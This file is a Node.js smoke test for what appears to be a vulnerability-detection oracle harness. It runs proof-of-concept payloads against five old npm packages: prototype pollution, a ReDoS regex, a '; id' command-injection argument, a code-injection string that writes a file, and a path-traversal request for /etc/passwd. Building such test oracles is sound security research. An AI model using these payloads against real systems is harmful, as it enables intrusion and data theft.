#!/usr/bin/env node
'use strict';
/**
 * Smoke-test all 5 oracle classes against known-good payloads.
 * Run from the repo root: node oracle/test_oracles.js
 */
const { run } = require('./harness');
const { execSync } = require('child_process');

const ROOT = require('path').resolve(__dirname, '..');

function killPort(port) {
  try { execSync(`lsof -ti:${port} | xargs kill -9`); } catch (_) {}
}

const TESTS = [
  {
    vulnClass: 'prototype-pollution',
    packageDir: `${ROOT}/prototype-pollution/101_1.0.0`,
    snippet: `
      const set101 = require('101/set');
      set101({}, '__proto__.polluted', 'yes');
    `,
  },
  {
    vulnClass: 'redos',
    packageDir: `${ROOT}/redos/ajv_5.2.2`,
    snippet: `
      const Ajv = require('ajv');
      const ajv = new Ajv();
      ajv.compile({
        type: 'object',
        properties: { foo: { type: 'string', oneOf: [{ pattern: 'if('.repeat(10000) + 'x' + ')'.repeat(10000) }] } },
      });
    `,
  },
  {
    vulnClass: 'command-injection',
    packageDir: `${ROOT}/command-injection/aaptjs_1.3.1`,
    snippet: `
      const aaptjs = require('aaptjs');
      aaptjs.list('; id', () => {});
    `,
  },
  {
    vulnClass: 'code-injection',
    packageDir: `${ROOT}/code-injection/access-policy_3.1.0`,
    snippet: `
      const a = require('access-policy');
      try { a.encode('\`; require(\`fs\`).writeFileSync(\`/tmp/oracle_ci_test\`,\`\`);//', {}); } catch(_) {}
    `,
  },
  {
    vulnClass: 'path-traversal',
    packageDir: `${ROOT}/path-traversal/angular-http-server_1.0.0`,
    webRoot:    `${ROOT}/path-traversal/angular-http-server_1.0.0`,
    setup: () => killPort(8000),
    snippet: `
      const { exec, execSync } = require('child_process');
      const sleep = require('sleep');
      try { execSync('lsof -ti:8000 | xargs kill -9'); } catch(_) {}
      const server = exec('node ./node_modules/angular-http-server/angular-http-server.js');
      sleep.sleep(2);
      const payload = '/..'.repeat(50) + '/etc/passwd';
      try { execSync('curl -s --max-time 5 --path-as-is "http://127.0.0.1:8000' + payload + '"'); } catch(_) {}
      sleep.sleep(1);
      server.kill();
    `,
  },
];

let pass = 0, fail = 0;
for (const t of TESTS) {
  if (t.setup) t.setup();
  const result = run({ ...t, timeout: 35000 });
  const ok = result.triggered;
  const mark = ok ? 'TRIGGERED ✓' : 'NOT triggered ✗';
  const evStr = JSON.stringify(result.evidence || result.error || '');
  console.log(`${t.vulnClass.padEnd(25)} ${mark} | ${evStr.slice(0, 80)}`);
  if (ok) pass++; else fail++;
}

console.log(`\n${pass}/${pass + fail} passed`);
process.exit(fail > 0 ? 1 : 0);
